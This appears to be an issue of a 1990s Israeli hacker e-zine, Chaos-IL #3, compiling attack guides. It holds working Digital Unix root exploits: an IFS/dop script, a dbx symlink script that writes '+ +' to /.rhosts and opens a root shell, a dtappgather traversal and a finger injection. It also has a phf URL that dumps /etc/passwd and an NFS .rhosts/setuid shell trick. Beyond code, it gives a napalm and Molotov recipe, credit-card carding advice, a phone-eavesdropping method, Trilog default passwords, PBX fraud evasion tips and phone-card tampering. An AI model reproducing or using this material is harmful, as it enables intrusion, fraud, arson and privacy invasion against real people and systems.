Note from morpher (morpher@netlimit.com):

Welcome to Chaos-IL issue #3!  I'm sorry it was a kind of delay until this new
issue came out... but if you'll take a brief look on the issue you'll see
it was worth waiting :).  First time we actually have a special guest directly
from Bezeq, who gave us an article that answer all the questions that came
up lately about Bezeq's PBXs and Extenders.  If you're currently using a PBX
or an Extender, or even if you are about to use, please make sure to read this
before begining so you'll know the risks :P  

I've said it once and I'll say it again, if you think you have any kind of
interesting, new and original information that you would like to write about,
email it to us, and we might include it in the incoming issue.  The fact
someone writes doesn't means he is a member, he's just another guy who wants
to share the information he got in hands.

It has been over a month since our last issue release and there have been
some major updates going on.  Chaos-IL became much bigger then what we ever
expected it to be and it's keep getting bigger even, checkout our current
member list for more info.

Trendline Hack Introduction
---------------------------

Trendline is an old Internet Service Provider company in the Internet fields
of Israel. Different from some of the other ISPs in Israel, Trendline is
an Hacker-friendly ISP. Trendline gives us almost everthing possible to:

-Hack them (Root them)
-Fraud thier accounts billing
-Flood them (simply)
-Hack thier webpage
-Abuse thier IRC users

Though all those, I'll be dealing with one thing rightnow: Hacking them,
or in other words, gaining root on thier system.
Trendline router is used on Digital Unix 4.0 Operating System, which is
known as a hell of holed system (pretty stupid to run a router on it).
In this article I exampled and described all the operations and high level
techniques you may use to gain root on thier system, though its a
regular DG/UX 4.0 as the others, Trendline's system has a few holes that
are specialized for thier host.

--

In order to try/excute all of the below techniques, you must have a trendline
account. Trendline accounts are easy to get on the public, or you can card
yourself one with a valid full-detailed credit card info. (you might want
to take a look at the PPA accounts carding article in Chaos-IL #2)

Trendline support number: 03-6388222  (use this to card)

After you are equiped' with account, access thier UNIX system through
the main host at trendline.co.il , or if you are fimilar with X.28 / X.25
routers you may make your work easier and access them through the escape
key ('^]') after you entered username (no password) for ppp mode.

/\NOTE/\

I'm writing this article as I'm assuming you are basically fimilar with UNIX,
so I wont start detailing every little command and technical step.


and YES, I did Hacked Trendline with one of the techniques listed below.


***************************************************************************


Local techniques
----------------

The first thing to try is the IFS hole in /usr/sbin/dop. If dop is setuid
root, there is a good chance that you can gain root this way. Here is a
shell script :

----------------------------------------------------------------------------

#!/bin/sh
cat > /tmp/usr <<EOF       
#!/bin/sh
IFS="   "                                                             
export IFS                                                       
exec /bin/sh               
EOF                                                                 
chmod 755 /tmp/usr         
IFS=/ PATH=/tmp:$PATH /usr/sbin/dop crack-user=root

----------------------------------------------------------------------------

After running this shell script, if it works, your euid should be 0. Your
prompt may or may not change depending on which shell you are using, so do
an id and check. That is a old sploit that most competent admins have 
probably fixed. 

Digital Unix has a large problem in the way that it handles core dumps of 
setuid root programs. If you can get a setuid root program to dump core,
it will create the core file as root, and it will follow symlinks. So,
how can we exploit this? I noticed a long time ago that if you run dbx
on a setuid root program that you have read access to, then it will core dump
in your current directory. Dbx is a debugger that comes with digital unix. 
However, some times machines won't have the liscence files installed
correctly. Here is the exploit :

----------------------------------------------------------------------------

#!/bin/sh
# dbx exploit by humble
# works on Digital Unix 4.x                                           
# this overwrites /.rhosts                                             
 
mkdir /tmp/.testing
cd /tmp/.testing                                                        
ln -s /.rhosts core                                                    
BOB="
+ +                                                   
"
export BOB                                                          
dbx /bin/crontab                                                      
dbx /bin/crontab                                                        
dbx /bin/crontab                                                         
rm -rf /tmp/.testing                                                
rsh -l root localhost /bin/sh -i

----------------------------------------------------------------------------

If /bin/crontab is not setuid root or you don't have read permissions to
it, you can use any other setuid root program.

Ok. If that doesn't work, there is another core dump situation I have
found. I have only verified this on three machines and have been told
that it hasn't worked on one or two others. The program /usr/X11/bin/dxpause 
is a screen locker. I found that when I run that program, and have my 
DISPLAY set to my freebsd or my linux box (running xfree86), the program
will dump core as root. Be carefull though, if the program doesn't dump
core, you will have to enter the password of the person who's account
you are using. You have to set up your X server to allow connections from
the target, and you will probably have to click once on your machine to
get the program running on the Trendline's Digital Unix box to crash. 
Anyway, this can be exploited in a similair fashion to the dbx problem.

There is another core dump that was mentioned on Bugtraq by Tom Leffingwell,
but I haven't been able to re-create it. Here is excerpts from his posting:

----------------------------------------------------------------------------

Version Affected:  Digital UNIX 4.0B *with* patch kit 5
                   Unpatched 4.0B is not vunerable to this particular   
                   problem, but it is to others.

Patch kit 5 included a replacement xterm because the old one had a bug, too.
They replaced it with another that had a bigger problem. You can cause a
segmentation fault in xterm simply by setting your DISPLAY variable to a
display that you aren't allowed to connect to or one that doesn't exist.
Start xterm, and you get a core file.

----------------------------------------------------------------------------

Ok, core dumps not working? Don't worry.. there's more to Trendline.
There has been some talk about holes in dtappgather on the security mailing
lists. We can use one of the holes to our advantage as well.
Using dtappgather, we can make any file on the system owned by us. This is
obviously a good way to take over a machine. Exploit:

env DTUSERSESSION=../../../../../../../../etc/passwd /usr/dt/bin/dtappgather

and /etc/passwd is now owned by us. This could be used to gain control of
/etc/inetd.conf and just about anything else you could imagine. I haven't 
used this exploit to mess around with the /tcb/files/auth/* tree, but I
would be willing to bet it is very successfull.

I've also noticed that the X server setup on some Digital Unix boxes are 
insecure. If you have a shell on the machine, try to set your DISPLAY to 
localhost:0 or the machines hostname:0, and then run a program like xkey.

Here are some exploits that I havent used or tried before (edited a little):

----------------------------------------------------------------------------

                         .LoW  _  _
                     |\  | _ |(_`|_'
                     |  \|(_)|,_)|_.
               ==========================

H0l4. So here it is another bug for Digital

System: OSF1 my.narco-goverment.sucks.co V4.0 464 alpha

Program: fstab - Static information about file systems and swap partitions
         advfsd - Starts the AdvFS graphical user interface daemon
Problemo: It creates a lockfile in tmp with nice permitions :)
   /tmp>ls -la

   (Blah Blah Blah.....)

   -rw-rw-rw-   1 root     system    0 Nov xx 15:49 fstab.advfsd.lockfile

What the hell to do with it:

   Before it creates
   ln -s /.rhosts /tmp/fstab.advfsd.lockfile

   from here... cat "+ +" > /tmp/fstab.advfsd.lockfile , etc etc.

                     The End - El Fin

                      Colombia 1997.

                         .LoW  _  _
                     |\  | _ |(_`|_'
                     |  \|(_)|,_)|_.

                   Efrain 'ET' Torres

----------------------------------------------------------------------------

This if for Digital Unix 3.x (I've never seen it work.)

$ ls -l /usr/tcb/bin/dxchpwd
-rwsr-xr-x   1 root     bin        49152 Jul 25  1995 /usr/tcb/bin/dxchpwd
$ ls -l /tmp/dxchpwd.log
/tmp/dxchpwd.log not found
$ export DISPLAY=:0     (or a remotehost)
$ ln -s /hackfile /tmp/dxchpwd
$ ls -l /hackfile
/hackfile not found
$ /usr/tcb/bin/dxchpwd
(The dxchpwd window will appear. Just enter root for username
 and anything for the passwd. You'll get a permission denied
message and the window will close.)
$ ls -l /hackfile
-rw-------   1 root     system         0 Nov 16 22:44 /hackfile

----------------------------------------------------------------------------

Remote techniques
-----------------

I don't have too much here except one pretty big hole. Digital Unix 4.x
is blind ip spoofable!!! So, if you can guess or determine a trust 
relationship, the machine is yours. Also, when the CERT statd advisory 
came out, Digital released a patch. I haven't played around with that, but
it might be worth looking into.

Also, Digital Unix 4.0 sometimes has an 0wned finger daemon, try this..

% finger İ/bin/w@host

if this gives uptime info etc, it shows the system is vulnerable to this
attack, you can specify any command.. simple to use.

 IRIS R9.1.3A Introduction

Hello Everybody, Here is some info on a relatively old System called IRIS or
Interactive Realtime Information Service. This system was originally meant
to run on older systems like PDP-8 and PDP-11. Due to the versatile nature
of IRIS, today a lot more systems run it. IRIS systems usually can be reached
at 1200 7E1 and after pressing either ESCape or Enter a few times, you should
see something like this as a greet:

-=-
Welcome to "IRIS" R9.1.3A timesharing !

ACCOUNT ID ?
-=-
Or sometimes it will say what you have reached under the welcome line. IRIS
is also extremely hacker-friendly as it will let you type account names for 
as long as you want. Also when you guess an account there are no passwords on
them. At first you will not see what you type, to change this type Control-E
to turn the echo on. Try CAPSLOCK also.
-=-

DEFAULT ACCOUNTS
----------------

MANAGER (Good System Access)
NO NAME (Normal User)
DEMO (Try the other ones first)
PDP8     /
PDP11   < == All General Accounts
SOFTWARE \

Hopefully you're in there with one of those accounts. Now, then you will get
a # prompt. If you are on with an account of access level 3, then you will
be able to use a user maintanencer program, by typing either ACCOUNTS or
ACCOUNT UTILITY. You should get:
-=-

 (0) EXIT TO SYSTEM
 (1) ADD NEW ACCOUNT

Ah, I wasn't able to create an account, but I did modify several. Basically
this is pretty straight forward.

Ok, after you're done playing with the accounts and exit properly there are 
a lot of interesting features on this IRIS. On one particular system that I
use often you have several utilities such as spreadsheets, word processors 
and even an ASM program. You can get a list of all the things to do by typing
LIBR at the # prompt. most of the filenames you type the response will be 
"NOT A PROCESSOR", Since most of the IRIS software was written is business
BASIC. Type BASIC LOAD <Filename>. Here are some of the most interesting 
programs.

PP or PORT ALL MONITOR will let you see who else is using the system. if 
for some reason you want to kick off a user, type PPP and then the user name.
Also if you want to see your own status type PROT.STAT

If you need help with something try typing GUIDE and it will give you a short
menu of all the help files available. Too bad there usually isn't many.

Another interesting utility to use is BLOCKCOPY, since I am not completely
used to it, I will show you what the guide said:

INTERACTIVE PROGRAM GUIDE ON SETTING UP BLOCKCOPY

INTRODUCTION

BLOCKCOPY IS A STAND-ALONE UTILITY PROGRAM WHICH GIVES GREAT
FLEXIBILITY IN COPYING ANY PART OF ONE DISC TO ANY PART OF
ANOTHER, EVEN ONTO A DIFFERENT DISC CONTROLLER.
BLOCKCOPY DOES NOT PROVIDE FAST PERFORMANCE, BUT IT CAN BE VERY
USEFUL IN SPECIAL CASES.  EXAMPLES:

1) YOU CAN COPY A SINGLE LOGICAL UNIT FROM ONE PACK TO ANOTHER,
   WITHOUT OVERWRITING OTHER LOGICAL UNITS ALREADY ON THE
   DESTINATION.

2) IF YOU HAVE BOTH LARGE STORAGE MODULES AND SMALLER CARTRIDGE
   DRIVES ON THE SAME SYSTEM, YOU CAN BACKUP YOUR SYSTEM LOGICAL
   UNIT 0 FROM STORAGE MODULE ONTO A CARTRIDGE PACK WHICH CAN
   BE SET ASIDE AS A DEDICATED SYSTEM BACKUP.

3) IF YOU HAVE A SPECIAL SWAPPING DISC, IT CAN BE BACKED
   UP TO AND RESTORED FROM OTHER STORAGE MODULES.

LIMITATIONS

NOTE THAT WHILE YOU CAN COPY FROM ONE TYPE OF DISC CONTROLLER
TO ANOTHER, THE RESULT MAY NOT BE INSTALLABLE UNDER
IRIS BECAUSE OF SOME DISC ADDRESS CONSIDERATIONS.

ALSO NOTE THAT YOU MAY NOT SPECIFY A DESTINATION WHICH
PHYSICALLY OVERLAPS THE SOURCE ON THE SAME PACK.
SETUP

FIRST, HAVE AT HAND YOUR R9.0 PERIPHERALS HANDBOOK.
NOTICE THAT FOR EACH TYPE OF DISC, THERE IS A DIFFERENT VALUE
FOR THE BZUD POINTER.
ALSO NOTICE THAT IT GIVES YOU FORMULAS TO COMPUTE VALUES CALLED PHYU.
FIND THE APPROPRIATE DISC SPECIFICATION SHEET(S) DESCRIBING
YOUR SOURCE (WHERE YOU ARE COPYING BLOCKS FROM) AND YOUR
DESTINATION (WHERE YOU ARE COPYING BLOCKS TO).  THE SOURCE
AND DESTINATION DO NOT HAVE TO BE THE SAME TYPE OF CONTROLLER.

04. How to make an improved Incendary Bottle


                        Chaos-il's NEW Anarchy Division
                        *******************************
   Article #1      How to make an improved Incendary Bottle
   ________________      (aka, Molotov Cocktail)     ___________
                                         By: Molotov

        Incendary Bottles, popularly known as Molotov Cocktails are used
to start fires in buildings or as weapons against vehicles or troops.
A Molotov Cocktail is nothing more than a glass bottle or jar which has been
filled with gasoline and plugged with a gas-soaked rag in the end. When the
rag is lit and the bottle is thrown, the gasoline is ignited and spreads a
sheet of flame.
        More effective Molotov Cocktails can be made by using homemade napalm
instead of gasoline. For those of you who don't know, napalm is simply gelled
gasoline which burns hotter than regular gasolne and clings to whatever it
splatters on!
        Now, on with the napalm... Napalm can be made in several easy ways.
The easiest method is to mix 36 parts by volume of gasoline with 1 part of
100-proof alcohol (whiskey or vodka) and 25 parts soap flakes. Only real soap
such as Ivory or Palmolive soap bars can be used. Detergent will NOT work.
        Put the gasoline in a bucket or other container and add the alcohol.
Stir the soap flakes in slowly until the gasoline sets in a thick gel.
After standing for a few days, the mixture will have the consistency of butter.
If necessary, it can be thinned by adding more gasoline.
        Gasoline can also be gelled with egg whites and any of the following
additives: instant coffee, sugar, Epsom salts, baking soda, or salt. To make
napalm, place the gasoline in a bucket and add 1 part of egg whites to every
6 parts of gasoline. Slowly add the coffee, sugar or some other suitable
material until the gasoline gels to the consistency of jam. This version of
napalm breaks down quickly and should be used within 24 hours.

                                Have fun!

So, you have an enemy who talks behind your back, eh? Or, maybe you just
would like to "listen" in on your friend's conversations? Well, if you have 2
phone lines and call waiting on one of them, you are in luck. (Only one
problem: your friend must also have call waiting!)

Procedure:

[1]  Call up your friend with the phone you want to listen with.  When he
answers call waiting (he's already on the phone, and you are the 2nd caller),
then you either sit there or say: sorry, I have the wrong #.
[2]  Next, you wait until he goes back to the other line (puts you on hold).
[3]  Then, pick up your other line and call ->YOUR<- call waiting.
[4]  Answer call waiting
[5]  Then go back to him. (Answer, and then click back.. Click ->2<- times
     answer, and go back..)
[6]  Hang up your second line
[7]  You are now on the line!
[8]  Listen and be Q U I E T !
     He can hear you!

Techniques I use to prevent noise or confusion:
If you have call forwarding, turn it on and forward calls somewhere before you
start listening. If a call comes through on your call waiting circuit,
the people talking (your buddie and his pal) will not hear anything,
but after you answer call waiting and come back, they will hear the other
call hang up (two clicks). If you don't have call forwarding, I suggest you
get it if you are going to make a habit of this, because it will become
a major pain in the ass. When your call waiting rings, you are removed
from the "listening" conversation and placed back on his hold circuit.
In order to get back on, you must answer the phone and wait for your party
when you answer the phone, tell the guy you are in a hurry and you have to go
or you'll call him back later or something) to hang up. When he or she hangs
up, you will be back on the conversation. Then, one of your pals will
say: What was that? (because of the clicks).. So, try to use call forwarding
if you can. Remember: Have fun, and don't abuse it. I am not sure about it,
because I just discovered it. It is illegal (what isn't these days) because
it is invading privacy". I don't know if Bezeq opers just did not realize
there was a flaw in it, or that was planned for line testing, I am not sure.

06. Guide to Bezeq's Extenders and PBXs


			Guide to Extenders and PBXs

                    By: TS (1996 - '98 Bezeq 199 oper)

Disclaimer: Don't blame any Chaos-IL members :-)

I will probably use a few abbrevations in this, so its would be good to know
them.  Here they are:

PBX: Private Branch eXchange
ANI: Automatic Number Identification
LD: Long Distance
ACN: Area Code and Number
IES: Internal Extension System
SCC: Specialized Common Carrier
ESS: Electronic Switching System
CAMA: Centralized Automated Message Acounting

A PBX and a extender are not the same thing.  They are used as the same word
because you can use them to accomplish the same goal: making a free ld or
local call.  First, I will talk about PBXs in general, and Bezeq's PBXs.

A PBX is a baically a few telephone numbers owned by a company. PBXs are
present when a company has a IES. An IES is a system in which a person at his
desk can dial three numbers to reach another person's desk in the same office.
If the person wants to dial outside of their office or building, they must
dial 9 then the ACN. I have also seen * and # instead of 9.  Some PBXs have
dial up lines so the people can work from home.  This way, the employees
don't have to pay for their business calls.  

The company gives each employee a certain authorazation code, so they can call
the dialup of the PBX, enter their authorazation code, and press 9 (or *,#),
then the acn, and their compnay pays for the call.
You can tell if you've found a PBX if there is a different ringback.
I suppose you'll know if you found one.  You can get them by randoming dailing
numbers (e.g: make an 177 number scan), or use your social engineering skills.

An extender is a service setup by a telephone company.  Basically, a extender
has the same function as a phone card.  You dial the phone number the phone
company gives you, enter your authorazation code, and the dial the acn (no 1).
Extenders can be found in the 177 NPA or in the 1-800 range.
1-800 numbers are free from your house, but not a pay phone.  There a few
possible ways to find extenders.  You could call the phone company and say
you forgot the phone number where I can enter my authorozation code.
Another way is to randoming dialing numbers.  I would use 177 numbers first.  

Ways of knowing you found an extender:     

1.  Get a dialtone after dialing the number.
2.  Short beep then silence.
3.  Constant tone that stops when you dial something.
4.  If you are asked for the code and phone number  (kind of obvious)


So if you find one of those, then you MAY have found an extender.  Number
three is most likely an extender.  I've never really seen any that aren't.
Once you have found an extender, you must find out how many digits are in the
code, and if it wants the code or acn first.  That's the hard part, I guess
you should just play around with it.  Listen for tones.

Most extenders are 177 numbers, and most 177 numbers are equipped with the
ability to trace.  Most extenders and PBXs have ANI which means it knows your
phone number when you call.  PBXs can sometime be found in local areas.
Extenders can normally call anywhere to the US and Canada.  All the PBXs
I work with can call basically anywhere.  1-800 extenders have a nice clear
connection, nice for data transfers.

I must now explain something about Bezeq, so I can tell you how to secure and
not get caught. ESS has the ability to trace calls.  ANI is what enables ESS
to trace.  ESS also has a tape which records information about phone calls.
This is called CAMA.  It records the number of the caller and receiver,
the time of the call, if the reciever answered the phone, and what time the
caller hangs up.  The tape is used for billing purposes.  Normally, 177 numbers
and local calls are ignore when it is sent for billing.  The billing machines
are quite sensitive though.

Here is a list of what extenders can detect (from my knoledge, I wouldn't be
suprised if this list could be doubled.)

1.  Sequenticial Dialing (if you use this, you saying "Bezeq! caught me!" :))

2.  Number of calls coming from a phone number (try to scan during the day,
    becuase who would make 400 calls at 3:00 a.m.?)

3.  Time between calls.  (like 5 calls in a minute, or if there is a code
    failure every couple of minutes.)

4.  Time it takes to dial a number.  (not many people can dial a phone number
    in 50 miliseconds.)

5.  Amount of time between each number.  (not many people can have exactly
    1 milisecond between the 8 the 0 and the 0.)

6.  (I hear rumors that they have list of Bezeqnet and Internet-zahav numbers,
    so don't call Bezeqnet and Inet-zahav all the time, makes sense to be true).

Basically, what I'm getting at is to use randomnization.  I would recommend
dialing everything by hand, but that would take to long, so find yourself
a good code hacker that has randomnization.  I don't really use them, so I
don't know of any.

Also, if you happen to find some codes, don't go crazy.  If you get 
caught, you probably won't go to court or anything like that.  Bezeq will
probably just send you a bill.  Some people say to distribute you authorozation
codes so that Bezeq can't bill all the people using their extenders or PBXs.
In a case like this, they would probably bill the persons who used it most
or they'll just prolly close the extender.

The analyer as most knows is one of the greatest computers hackers in the
world, he hacked so many boxes but only harmed natzi and kids porn sites.
The analyzer has already hacked heavy secured servers around the globe when
The Pentagon is one of them (not many know but the usa missile center was
hacked by the analyzer by a mistake, he didn't know he was hacking a missile
center box, he was sure he's hacking another .gov box).
The analyzer has started hacking since he was 13 years old when he started
his own hacking programs which he's been using until today with improvements
of course.
The analyzer began hacking boards, and was working with the sysop of the
legendary Aquarious BBS. Since then he's hacked quite a few shells ,  not only
to see if he can face the challange like he's usually done but to get back
in natzies and in other people who's got into a fight with him.he's gained
ircop priviliges a couple of times during fights in natzi channels and even
after he's told the box administrators about the holes he continued
controlling their systems.
The analyzer was caught after that fbi agents have already captured the wrong
people a couple of times ,  like a poor surfer in Hawaii,  2 guys from the us
whom analyzer had taught his tricks and a couple of analyzer's friends, after
those busts he's published his name in the internet in order to save his
friends.

The analyzer wasn't allowed to leave his house for 10 days , and obviously not
to touch a computer since his was taken away by the police.
Right now as you're reading this ,  the analyzer awaits his sentence which
will probably be a fine.

                   Getting around with newbie Hacking
                  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~     
				by F0x

	In the following text i will give you a step through how to get
started with hacking guide. and a little FAQ..
FAQ:
can some1 hack into my Windows95? no! unless yer using Explorer 3.00 which
has a bug which was fixed....in any version available currently. i don't
think any1 will have ie 3.00...
how can i hack irc??? there is no such thing as HACKING IRC! if you ask
that question you will get kicked from any normal hacking channel.
what can i hack then? computers which are ment for mass use(use for more
then one person)... if you are smart enough to hack you will understand
y...
	Now let's begin, to be a little more specific, the most easiest
system to hack is unix, because it's main perpose is to serve more than
one user at the same time, and we know lot's of bugs for it..
if you wanna learn unix hacking i can give you detailed process:
1. Hate Microsoft & Windows 95 in particular
2. Get Linux
3. Install Linux(don't ask some1 to install it for ya.. if you can't
	install it yerself, using non-direct help don't even start hacking)
4. Maintain Your Linux / Make Linux yer primary OS
**********You're almost there***********
5. Get Exploits ( to get good ones is the hard part! )

	What is a passwd file? and what can you learn from it?
a passwd file is a file called passwd and it's full path on any unix
system is /etc/passwd. A passwd file contains all the users , and their
passwords in one way encrypted format. it's full format is
user:encrypted-pass:userid:usergroupid:full-name:/home/path:/bin/shell
-- I will use this info l8r.
	PHF
	---
	Phf is a program ment to test other programs and return their
stats and enverionmental variables. however, it can be manipulated and all
you need is just to give this a thought: it tests ==> it runs the programs
==> you can run any program even cat /etc/passwd (cat command is like
"type" in dos) ==> you can get the user list and their encrypted
passwords. why is this useful? because phf runs from the web server and
this should be it's full path: http://www.notmaintained.edu/cgi-bin/phf so
this means we can execute that command remotely. Now all we need to know
is how to crack those encrypted passwords and we're done. This is why we
have passwd crackers such as "John The Ripper" or "Cracker Jack" which are
the best (i preffer john, you can net search for these programs anywhere).
Anyhow using phf isn't tough, you can use my phfcommand.c or phfscan.c
available at                    . Now i will show the exploit line:
www.trying.edu/cgi-bin/phf?Qalias=x%0acat%20/etc/passwd
and that's it.(put this line on any browser(of course lynx is preffered -
and guess y?... because it has nothing to do with microsoft.

For the advanced.......... MOUNT
			   ^^^^^
apparently not every1 knows what this means...in order to use bug you need
to at least own or 0wn one unix box(0wn = own by haxing) <== you already
have root. what you need to do is showmount -e host , this may sometimes
give u a list of directories, some may be users directories so all you
have to do is mount. in order to mount you need to type(as root)
mount -t nfs remote:/directory /local/dir
or
mount -F nfs remote:/directory /local/dir
(the directory must exist)
Mount with rw, and then put in a users home directory a
.rhosts with a line containing "+ +" and then rlogin with that user then
hacking the system is even easier, make a file called test.c containing
the following line:
main(){setuid(0);setgid(0);system("/bin/sh")}
you can replace sh by your favorite available sh. now compile it:
cc test.c -o test
Now, if you have mounted it with "rw" succesfully then you can now chown 
it to root then chmod u+s test and you've hacked it!!

                         - ---[ by morpher ]--- -   



Trilog PM Systems                       

What is Trilog? well, Trilog is a Voice/Phone Mail boxes network that provides
full VMB (Voice Message Box) services plus options to contact with other
VMB boxes on the network. Each VMB has it own network identification number.
(Trilog boxes are'nt fully VMB service, but we'll pretend it is so things
 will be clear :P)

Trilog running PM (PhoneMail) monitoring Systems that can be found on the
177 free toll, and soon to be found on the 1-800 free toll also. Each PM
system includes her own data of VMBs, User details (the VMB owners, etc.)
A Trilog PM system allows you to control and monitor everything possible
in the correct data that the PM has. 

This will article will basically show you the easiest way to set yourself
up a VMB on these systems.  I think I explained it pretty clearly so if you
can't follow this, you have an IQ of 80 or less.. Dumb fucker. 

As usual, use a scanner to scan for the Trilog PM systems, this is the most
easiest part; there are over 20 systems that I know of, in the 177 free toll,
if you find one of thier VMBs in the scanning or you just have a number of
one somehow, try to dial numbers similar for the VMB to get the Trilog PM sys.
For example, if you have some Trilog VMB number... 177-022-1212
try dialing similar numbers such as 177-000-1213 or the like.  The PM system
that control this VMB you have and many more, are mostly found in the same
digit as all of it VMBs are in. 


This is what a Trilog PM system usually looks like:


   CARRIER 1200

   Trilog PM 9252 9254 Microcode Version 5.2
   Copyright (C) PM Systems 1991
   All Rights Reserved.

   PM Login>

 
Older version of Trilog will drop you to a "Command %" prompt but for
the most part, use the previous description in identifying them.
 
Typing "?" at the PM Login prompt will show the valid login accounts.

   PM Login> ?
   Valid login modes are:
      SYSADMIN,
      TECH,
      POLL.
 
Possible defaults for these account follow: 

 PM Login         PM Password          
 --------         -----------
 SYSADMIN         SYSADMIN,FIELD,TECH,SYS,ADMIN,<ENTER>
 TECH             FIELD,TECH,SYS,ADMIN
 POLL             FIELD,POLL,TECH,SYS,ADMIN 

   PM Login>TECH
   PM Password>
   Invalid Password.
   PM Password>
   PM Action> (woo-hoo! ..you're in! :P)


*NOTE* This time default logins WORKS! They are unexpected for someone to
try breaking in. 

Once logged in, you will most likely get a "PM Action>" prompt.  Typing "?"
displays the following:

   PM Action>?
                  The following commands are valid:
     Activate <session #>         - Activate the session
     Broadcast                    - Broadcast a message to all terminals
     Connect <subsystem> <node #> - Invoke the subsystem
     Terminate <session #>        - Terminate the session
     List                         - List all open sessions
     Logout                       - Terminate all sessions and log off.
     Login <login mode>           - Logout and login again.
     Display                      - Display sessions status on a site.
     TechView <on/off>            - Enable/Disable TechView training.

We first must connect to the subsystem which is where all commands are
invoked to control/monitor the voice mail system.  Type "connect":

   PM Action>connect
ÿÿÿ
   Screen 1 - SVI on Node 1  is now active.


You will now be brought to a "Node # - SVI>" prompt.  Typing "?" displays
the following.

This is usefull especially in this case because you want your mailbox to
blend in with the other.  In this case, you would want to set up a mailbox 
at box number 3[5678]XX instead of box 1111 or 9999.

The "list" action under system administator function profile, lists a users
profile in complete detail showing all settings with their specified mailbox.

This information can be used as a basis for your information if you're not
sure what to enter when adding your own profile.

Now, let's add our own profile (mailbox).  For this, we use the action "add"
under system administration function profile.


   Function:  profile
   Sat Jul  6, 1996  6:42 PM

   Action:  add

   Name (last first)   :  PM    
   Class Number        :  10
   Extension Number     [1]   3500  
   Extension Number     [2]   
   Trilog Password  : (Default = ##########):  
   Group Name          : (Default = ):  
   Referral Extension  : (Default = 0):  
   Trilog Capability: (Default = 
            Accept Messages   Answer Phone  Do Message Alert
                 TRUE              TRUE              TRUE
     Enter T or F for each field):  
   Abbreviated Prompts?: (Default = FALSE):  
   Alt Greeting Active?: (Default = FALSE):  
   Software Mailbox    : (Default = FALSE):  
   Failed Acc Attempt  : (Default = 0):  

     If you wish to exit, type ";".
   First Field of Form:  
   Name (last first)   : (Previous = PM):  ;

   Done.
   Name (last first)   :  ;

   
Now we have our own mailbox at box #3500. (for access info see end of article)
Let's take a closer look at the steps involved:
   
   Name (last first)   :  PM    
   
Selecting a name.  Here, i chose "PM" as i thought the System Admin to be   
an idiot who would think it is a default box and not to mess with it.  A
regular name will blend in well with the others though.
   
   Class Number        :  10
   
Selecting a class number designates what class your mailbox is under.    
Certain classes have different options such as being able to have more
messages w/o being forced to delete them or having the dialout feature.
Check out the "ClassOfService" function.   
   
   Extension Number     [1]   3500
   
Enter a mailbox number you wish to have which is empty.   

   Extension Number     [2]   
   
If you want to set up more than one mailbox with the same profile.   

   Trilog Password  : (Default = ##########):  
   
Enter the password you would like to have.  It will not be echoed to 
the screen.

   Group Name          : (Default = ):  
   Referral Extension  : (Default = 0):  
   Trilog Capability: (Default = 
            Accept Messages   Answer Phone  Do Message Alert
                 TRUE              TRUE              TRUE
     Enter T or F for each field):  
   Abbreviated Prompts?: (Default = FALSE):  
   Alt Greeting Active?: (Default = FALSE):  
   Software Mailbox    : (Default = FALSE):  
   Failed Acc Attempt  : (Default = 0):  

Go with the defaults for a regular mailbox here.  They should be set up
correctly.
     
     If you wish to exit, type ";".
   First Field of Form:  
   Name (last first)   : (Previous = PM):  ;

   Done.
   Name (last first)   :  ;

Keep smacking ";" to exit.

Now let's verify that the profile was added.

Good.  You now have a VMB.  


Accessing your VMB's 177 number
+-----------------------------+

Ok, you got your box up at #BLABLA on the network, at this point we get into
a little problem but one that can be simply resolved.  At regular situations,
the persons who own the VMBs and paying for them, getting the 177 access
number to thier box at the time they are registering, but we didnt :))
so the last mighty thing we can do, is calling Trilog and fooling them so
you'll get your new box access number and start running things up.

Follow me and dont mix bullshits, you'll have your VMB access number in less
then 2 mins.  

The Trilog Info. center is at 177-022-4470 : The direct number to the Info.
center cannot be found, or they dont publish it. If anyone finds it sooner
or later, please hook me up and email me. 

Call up the Info. Center and wait for an operator to pick up on you, give
them your box number as your setting in the PM system. (e.g #3500).
simply say that you are leaving Israel in a few days for a trip, and you
want to give your friends the VMB 177 number so they can leave you msgs while
you are away. In 90% of the cases she'll simply give you the number and say
a nice byebye, in 70% of the cases she'll ask a few identification questions
and then give you the number :)) (she wont ask anything like card number, etc.
only info printed at her desk.. and that's actually the info that you saw
while setting your VMB up. Remember to print/capture this info so you'll know
what to answer the Trilog operator when you'll be asked.

        *Have phun*

11. TeleCards Resetting



TeleCards Resetting
-------------------
Telecards' working method is a really simple one actually, all they check
for is those little black magnatic lines which mark the usage of a call.
Now, you may wonder how the fuck can i use it for my benefits ? , well,let me
tell you how you can do such a thing.

All you need is a niddle and a magnet.
The first thing you do is taking a telecard, used of course,Take the niddle
and squize it in the middle of the black line, after you've succeeded in
doing that, and brought that black stripe to the edge of the card,just simply
take a magnet, and pull the black stripe with it, it might take a while until
you get the hang of it,but finally you'll do it right.
After doing that, you can actually reset the whole card and make it new
again, over and over again.

NOTE:
------
Since Bezeq has learnt about that method, you should search for the older
cards which don't have a plastic cover on that black stripe.
